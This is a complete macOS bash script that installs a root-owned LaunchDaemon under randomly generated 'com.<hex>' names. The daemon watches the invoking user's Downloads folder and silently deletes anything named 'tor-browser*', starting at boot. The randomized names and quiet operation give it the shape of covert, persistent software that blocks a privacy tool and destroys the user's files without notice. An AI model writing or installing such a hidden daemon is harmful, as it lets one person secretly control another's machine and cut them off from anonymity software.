#!/bin/bash

# generate random-ish component names
RAND=$(openssl rand -hex 4)
SCRIPT_PATH="/usr/local/bin/com.${RAND}.helper"
PLIST_LABEL="com.${RAND}.svc"
PLIST_PATH="/Library/LaunchDaemons/${PLIST_LABEL}.plist"
USER_HOME=$(eval echo ~$SUDO_USER)
DOWNLOADS="$USER_HOME/Downloads"

# write the watcher script
cat > "$SCRIPT_PATH" << EOF
#!/bin/bash
for item in "$DOWNLOADS"/tor-browser*; do
  if [ -e "\$item" ]; then
    rm -rf "\$item"
  fi
done
EOF

chmod +x "$SCRIPT_PATH"
chown root:wheel "$SCRIPT_PATH"

# write the plist
cat > "$PLIST_PATH" << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>
  <string>${PLIST_LABEL}</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/bash</string>
    <string>${SCRIPT_PATH}</string>
  </array>
  <key>WatchPaths</key>
  <array>
    <string>${DOWNLOADS}</string>
  </array>
  <key>RunAtLoad</key>
  <true/>
</dict>
</plist>
EOF

chown root:wheel "$PLIST_PATH"
chmod 644 "$PLIST_PATH"

launchctl load "$PLIST_PATH"

echo "Done. Service running."
